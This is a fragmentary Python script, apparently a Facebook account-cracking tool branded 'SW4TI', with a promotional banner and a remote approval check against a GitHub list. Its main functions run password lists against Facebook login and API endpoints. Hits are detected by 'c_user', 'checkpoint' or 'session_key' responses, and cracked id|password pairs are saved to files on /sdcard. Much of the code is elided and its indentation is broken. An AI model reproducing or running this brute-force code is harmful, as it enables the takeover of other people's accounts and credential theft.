...
def menu_apikey():
  ...
  print(f"""\x1b[1;32m
    ...
    ┌─────────────────────────────────┐
     ...
     [✓] FACEBOOK    : AB KHANX      
     [✓] YOUTUBE     : MSS TRICKS             
     [✓] VERSION     : \033[1;32m2.2\033[1;32m            
    └─────────────────────────────────┘""")                                           
  ...
  os.system(f'xdg-open https://www.facebook.com/KINGXMRSW4TI')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/MR-K1NGX/SWATI/blob/main/s.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://www.facebook.com/KINGXMRSW4TI?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get("https://github.com/MR-K1NGX/SWATI/blob/main/s.txt").text
	try:
		httpCaht = requests.get("https://github.com/MR-K1NGX/SWATI/blob/main/s.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [SW4TI-0K] %s | %s'%(ids,pas))
                                open(f'/sdcard/SW4TI-0K.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [SW4TI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SW4TI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SW4TI-0K] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SW4TI-0K.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[SW4TI-0K] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[SW4TI-CP] '+idf+' | '+ps+'\033[0;97m')
